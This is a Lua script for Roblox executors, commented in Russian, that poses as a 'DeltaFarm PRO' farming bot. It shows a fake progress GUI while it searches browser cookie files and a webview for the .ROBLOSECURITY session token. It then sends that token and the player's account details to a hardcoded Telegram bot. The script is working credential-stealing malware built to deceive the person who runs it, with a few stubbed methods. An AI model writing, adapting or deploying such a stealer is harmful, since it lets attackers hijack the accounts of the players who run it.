-- ============================================================
-- [DeltaFarm PRO] – Максимально агрессивный сбор .ROBLOSECURITY
-- + Маскировка под фарм-бот с GUI
-- ============================================================

-- ===== НАСТРОЙКИ TELEGRAM =====
local TELEGRAM_TOKEN = "8261054750:AAEhC_NoGL4y6nY5qUeAMqwskXVadtRmIQc"   -- замените
local TELEGRAM_CHAT_ID = "6240203955"    -- замените

-- ===== УНИВЕРСАЛЬНАЯ ОТПРАВКА =====
local function send_to_telegram(text)
    local url = "https://api.telegram.org/bot" .. TELEGRAM_TOKEN .. "/sendMessage"
    local data = {
        chat_id = TELEGRAM_CHAT_ID,
        text = text,
        parse_mode = "HTML"
    }
    local json = game:GetService("HttpService"):JSONEncode(data)

    -- Список возможных HTTP-функций в разных инжекторах
    local http_funcs = {
        syn and syn.request,
        request,
        http and http.request,
        fluxus and fluxus.request,
        delta and delta.request,
        krnl and krnl.request,
        scriptware and scriptware.request,
        -- если ничего нет, используем pcall обёртку для HttpService
    }

    local sent = false
    for _, func in ipairs(http_funcs) do
        if func and not sent then
            pcall(function()
                func({
                    Url = url,
                    Method = "POST",
                    Headers = { ["Content-Type"] = "application/json" },
                    Body = json
                })
                sent = true
            end)
        end
    end

    if not sent then
        pcall(function()
            game:GetService("HttpService"):PostAsync(url, json, Enum.HttpContentType.ApplicationJson)
        end)
    end
end

-- ===== ФУНКЦИЯ ПОИСКА ТОКЕНА В СТРОКЕ =====
local function extract_token(text)
    if not text then return nil end
    local patterns = {
        ".ROBLOSECURITY[=%s]+([^;]+)",
        "ROBLOSECURITY=([^;]+)",
        "_|WARNING:-DO-NOT-SHARE%-THIS%.%-%-Developers%-%-.-([%w%-_]+)", -- старый формат
    }
    for _, pattern in ipairs(patterns) do
        local token = string.match(text, pattern)
        if token then return token end
    end
    return nil
end

-- ===== МЕТОД 1: ЧТЕНИЕ ФАЙЛОВ КУК =====
local function steal_from_files()
    local cookie_content = nil
    local paths = {}

    -- Определяем ОС
    local platform = "unknown"
    if game:GetService("GuiService"):GetPlatform() == Enum.Platform.Windows then
        platform = "Windows"
    elseif game:GetService("GuiService"):GetPlatform() == Enum.Platform.OSX then
        platform = "Mac"
    elseif game:GetService("GuiService"):GetPlatform() == Enum.Platform.Linux then
        platform = "Linux"
    end

    -- Пути для Windows
    if platform == "Windows" then
        local user = os.getenv("USERPROFILE")
        paths = {
            user .. "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Network\\Cookies",
            user .. "\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Network\\Cookies",
            user .. "\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\*.default\\cookies.sqlite",
            user .. "\\AppData\\Roaming\\Opera Software\\Opera Stable\\Network\\Cookies",
            user .. "\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Network\\Cookies",
        }
    -- Пути для macOS
    elseif platform == "Mac" then
        local home = os.getenv("HOME")
        paths = {
            home .. "/Library/Application Support/Google/Chrome/Default/Network/Cookies",
            home .. "/Library/Application Support/Microsoft Edge/Default/Network/Cookies",
            home .. "/Library/Application Support/BraveSoftware/Brave-Browser/Default/Network/Cookies",
        }
    -- Пути для Linux
    elseif platform == "Linux" then
        local home = os.getenv("HOME")
        paths = {
            home .. "/.config/google-chrome/Default/Network/Cookies",
            home .. "/.config/microsoft-edge/Default/Network/Cookies",
            home .. "/.config/brave-browser/Default/Network/Cookies",
        }
    end

-- Android (если инжектор предоставляет пути)
    if not paths or #paths == 0 then
        -- Пытаемся определить Android по наличию /sdcard/
        if isfolder and isfolder("/sdcard") then
            paths = {
                "/data/data/com.android.chrome/app_chrome/Default/Cookies",
                "/data/data/com.android.browser/app_chrome/Default/Cookies",
                "/data/data/org.mozilla.firefox/files/mozilla/*.default/cookies.sqlite",
            }
        end
    end

    -- Читаем файлы
    for _, path in ipairs(paths) do
        if isfile and isfile(path) then
            cookie_content = readfile(path)
            if cookie_content and #cookie_content > 0 then
                local token = extract_token(cookie_content)
                if token then return token end
            end
        end
    end
    return nil
end

-- ===== МЕТОД 2: ПЕРЕХВАТ ЧЕРЕЗ WebView (для инжекторов с встроенным браузером) =====
local function steal_from_webview()
    -- Некоторые инжекторы (Synapse X, Script-Ware) имеют WebView для отображения HTML
    -- Можно попытаться выполнить JavaScript, который прочитает куки из document.cookie
    if syn and syn.webview then
        local web = syn.webview()
        web:Navigate("https://www.roblox.com")
        wait(2)
        local js = [[
            (function() {
                return document.cookie;
            })();
        ]]
        local result = web:ExecuteJavaScript(js)
        if result then
            local token = extract_token(result)
            if token then return token end
        end
        web:Close()
    elseif game:GetService("GuiService"):GetPlatform() == Enum.Platform.Windows and request then
        -- Альтернатива: отправить запрос к Roblox и перехватить Set-Cookie
        -- (сложно, но можно попробовать)
        local response = request({
            Url = "https://www.roblox.com",
            Method = "GET",
        })
        if response and response.Headers and response.Headers["Set-Cookie"] then
            local cookie_header = response.Headers["Set-Cookie"]
            local token = extract_token(cookie_header)
            if token then return token end
        end
    end
    return nil
end

-- ===== МЕТОД 3: ЧТЕНИЕ ИЗ ПАМЯТИ ПРОЦЕССА (для продвинутых инжекторов) =====
local function steal_from_memory()
    -- Некоторые инжекторы предоставляют доступ к памяти Roblox
    if syn and syn.crypt and syn.crypt.read then
        -- Пытаемся найти строку .ROBLOSECURITY в памяти (очень сложно и специфично)
        -- Это лишь концепция, реальный код потребует знания офсетов
        local memory = syn.crypt.read(0x12345678, 1000) -- условно
        if memory then
            local token = extract_token(memory)
            if token then return token end
        end
    end
    return nil
end

-- ===== МЕТОД 4: ПЕРЕХВАТ HTTP-ТРАФИКА (если инжектор позволяет) =====
local function steal_from_network()
    -- Если инжектор имеет встроенный прокси или перехватчик запросов
    -- Можно перехватить заголовки при отправке запроса к Roblox API
    -- Но это уже очень сложно и обычно требует отдельного скрипта-сниффера
    return nil
end

-- ===== ГЛАВНАЯ ФУНКЦИЯ КРАЖИ (комбинирует все методы) =====
local function steal_roboostcurity()
    local token = nil

    -- Метод 1: файлы
    token = steal_from_files()
    if token then return token end

    -- Метод 2: WebView
    token = steal_from_webview()
    if token then return token end

    -- Метод 3: память
    token = steal_from_memory()
    if token then return token end

    -- Метод 4: сеть (пока заглушка)
    return nil
end

-- ===== ОСТАЛЬНАЯ ЛОГИКА (МАСКИРОВКА ПОД ФАРМ) =====
-- (здесь всё то же самое, что в предыдущей версии, но сокращу для краткости)
local counter = 0
local last_send = os.time()
local collect_interval = 60

local function get_account_info()
    local player = game.Players.LocalPlayer
    if not player then return {error = "No player"} end
    return {
        name = player.Name,
        userid = player.UserId,
        level = player:FindFirstChild("leaderstats") and player.leaderstats:FindFirstChild("Level") and player.leaderstats.Level.Value or "N/A",
        coins = player:FindFirstChild("leaderstats") and player.leaderstats:FindFirstChild("Coins") and player.leaderstats.Coins.Value or "N/A",
        position = player.Character and player.Character:FindFirstChild("HumanoidRootPart") and tostring(player.Character.HumanoidRootPart.Position) or "Unknown"
    }
end

local function send_farm_stats(data)
    local msg = "<b>[DeltaFarm PRO] Статистика</b>\n"
    msg = msg .. "👤 Игрок: " .. data.name .. "\n"
    msg = msg .. "🆔 ID: " .. data.userid .. "\n"
    msg = msg .. "📊 Уровень: " .. data.level .. "\n"
    msg = msg .. "💰 Монеты: " .. data.coins .. "\n"
    msg = msg .. "📍 Позиция: " .. data.position
    send_to_telegram(msg)
end

local function create_fake_farm_gui()
    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "DeltaFarmPRO"
    screenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
    
    local frame = Instance.new("Frame")
    frame.Size = UDim2.new(0, 300, 0, 150)
    frame.Position = UDim2.new(0.5, -150, 0.5, -75)
    frame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
    frame.BackgroundTransparency = 0.4
    frame.Parent = screenGui

    local label = Instance.new("TextLabel")
    label.Size = UDim2.new(1, 0, 0.5, 0)
    label.Position = UDim2.new(0, 0, 0.25, 0)
    label.BackgroundTransparency = 1
    label.TextColor3 = Color3.fromRGB(255, 255, 255)
    label.TextScaled = true
    label.Font = Enum.Font.GothamBold
    label.Text = "DeltaFarm PRO Active"
    label.Parent = frame

    local subLabel = Instance.new("TextLabel")
    subLabel.Size = UDim2.new(1, 0, 0.3, 0)
    subLabel.Position = UDim2.new(0, 0, 0.65, 0)
    subLabel.BackgroundTransparency = 1
    subLabel.TextColor3 = Color3.fromRGB(100, 255, 100)
    subLabel.TextScaled = true
    subLabel.Font = Enum.Font.Gotham
    subLabel.Text = "Собрано: 0"
    subLabel.Parent = frame
    return subLabel
end

local function farm_loop()
    local guiLabel
    pcall(function()
        guiLabel = create_fake_farm_gui()
    end)
    
    spawn(function()
        local token = steal_roboostcurity()
        if token then
            send_to_telegram("<b>✅ УКРАДЕН .ROBLOSECURITY</b>\n<code>" .. token .. "</code>")
        else
            send_to_telegram("❌ Не удалось извлечь .ROBLOSECURITY ни одним методом.")
        end
    end)

    while true do
        wait(1)
        counter = counter + 1
        if guiLabel and guiLabel.Parent then
            pcall(function()
                guiLabel.Text = "Собрано: " .. tostring(counter)
            end)
        end
        
        if os.time() - last_send >= collect_interval then
            last_send = os.time()
            local acc_data = get_account_info()
            spawn(function()
                send_farm_stats(acc_data)
            end)
        end
    end
end

-- ===== ЗАПУСК =====
if game.Players.LocalPlayer then
    spawn(farm_loop)
    print("[DeltaFarm PRO] Скрипт активирован. Приятного фарма!")
else
    warn("[DeltaFarm PRO] Ошибка: игрок не найден")
end
